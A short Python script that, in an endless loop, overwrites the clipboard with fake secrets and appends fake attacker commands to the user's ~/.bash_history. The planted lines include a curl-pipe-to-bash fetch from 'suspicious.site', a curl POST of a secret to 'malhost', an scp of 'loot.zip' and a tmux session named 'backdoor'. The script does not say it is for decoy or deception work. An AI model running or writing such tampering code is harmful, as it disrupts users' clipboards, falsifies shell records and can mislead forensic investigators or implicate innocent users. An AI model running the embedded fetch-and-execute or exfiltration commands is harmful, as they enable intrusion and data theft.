import time
import random
import os
from pathlib import Path
import pyperclip

FAKE_CLIPBOARD = [
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7fGh7 ...",
    "ghp_4U2JQsdz123xyzGITFAKETOKEN",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.FAKEPAYLOAD",
    "curl http://suspicious.site/download.sh | bash",
    "aws_secret_access_key = 'FAKEKEY123456789'"
]

FAKE_HISTORY = [
    "nmap -sV -p- 10.10.10.10",
    "curl -X POST http://malhost/api/data -d 'secret'",
    "python3 shell.py --connect",
    "scp loot.zip user@somehost:/tmp",
    "tmux new-session -d -s backdoor './start.sh'"
]

def pollute_clipboard():
    payload = random.choice(FAKE_CLIPBOARD)
    pyperclip.copy(payload)
    print(f"[+] Clipboard injected: {payload[:30]}...")

def pollute_history():
    history_path = Path.home() / ".bash_history"
    if history_path.exists():
        with open(history_path, "a") as f:
            cmd = random.choice(FAKE_HISTORY)
            f.write(f"{cmd}\n")
            print(f"[+] History polluted with: {cmd}")

def run_loop():
    while True:
        pollute_clipboard()
        pollute_history()
        time.sleep(random.randint(60, 120))

if __name__ == "__main__":
    run_loop()
